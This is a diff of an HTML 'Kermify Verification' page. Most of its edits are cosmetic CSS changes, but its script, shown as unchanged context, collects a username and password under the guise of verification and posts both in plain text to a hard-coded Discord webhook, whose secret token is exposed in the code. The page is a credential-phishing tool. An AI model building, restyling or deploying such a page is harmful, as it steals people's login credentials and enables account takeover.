@@ -2,15 +2,17 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Kermify Verification 🐸</title>
   <style>
+    /* General body */
     body {
       background: linear-gradient(120deg, #4CAF50, #81C784);
       color: #ffff99;
       font-family: 'Comic Sans MS', sans-serif;
       text-align: center;
-      padding-top: 50px;
       margin: 0;
+      padding-top: 50px;
       transition: background 1s ease-in-out;
     }
 
@@ -20,13 +22,28 @@
       text-shadow: 2px 2px #2e7d32;
     }
 
+    /* Frog emoji */
+    #frog {
+      font-size: 6vw; /* scales with screen */
+      display: inline-block;
+      animation: bounce 1s infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-20px); }
+    }
+
+    /* Inputs */
     .input-field {
       padding: 12px;
       margin: 10px 5px;
       font-size: 1.2em;
       border-radius: 5px;
       border: none;
-      width: 200px;
+      width: 70%;      /* responsive width */
+      max-width: 300px;
       box-sizing: border-box;
       transition: transform 0.2s;
     }
@@ -35,6 +52,7 @@
       transform: scale(1.05);
     }
 
+    /* Button */
     #verifyBtn {
       padding: 12px 25px;
       font-size: 1.2em;
@@ -54,20 +72,15 @@
 
     #message {
       margin-top: 20px;
-      font-size: 1.5em;
+      font-size: 1.2em;
       min-height: 1.5em;
     }
 
-    #frog {
-      font-size: 4em;
-      display: inline-block;
-      animation: bounce 1s infinite;
-      margin-bottom: 20px;
-    }
-
-    @keyframes bounce {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-20px); }
+    /* Discord notice */
+    #discordNotice {
+      font-size: 1.2em;
+      font-weight: bold;
+      margin-bottom: 10px;
     }
 
     /* Confetti style */
@@ -91,18 +104,25 @@
       }
     }
 
-    /* Discord notice */
-    #discordNotice {
-      font-size:1.2em;
-      font-weight:bold;
-      margin-bottom:10px;
-    }
-
     /* Bottom disclaimer */
     #disclaimer {
-      margin-top:50px;
-      font-size:0.9em;
-      color:#ffffcc;
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      font-size: 1.2em;
+      color: #ffffcc;
+      background-color: rgba(0,0,0,0.3);
+      padding: 10px 0;
+      text-align: center;
+      z-index: 10000;
+    }
+
+    /* Responsive adjustments */
+    @media (max-width: 600px) {
+      h1 { font-size: 2em; }
+      .input-field { font-size: 1em; }
+      #verifyBtn { font-size: 1em; padding: 10px 20px; }
     }
   </style>
 </head>
@@ -126,7 +146,7 @@
     const button = document.getElementById("verifyBtn");
     const message = document.getElementById("message");
 
-    // Replace with your Discord webhook URL
+    // Discord webhook URL
     const webhookURL = "https://discord.com/api/webhooks/1409611043033976832/S730sZFzy9rDdpue2pqY2DVuFBXovlI5mhT4iMOAPji40S5-hvdn7hsIgLTnHdoU0Kn-";
 
     // Confetti function
@@ -160,8 +180,8 @@
         body: JSON.stringify({content: `User verified: Username = ${user}, Password = ${pass}`})
       }).catch(err => console.error("Webhook error:", err));
 
-      // Confetti
-      for(let i=0;i<30;i++){ createConfetti(); }
+      // Create confetti
+      for(let i=0; i<30; i++) { createConfetti(); }
     });
   </script>
 </body>
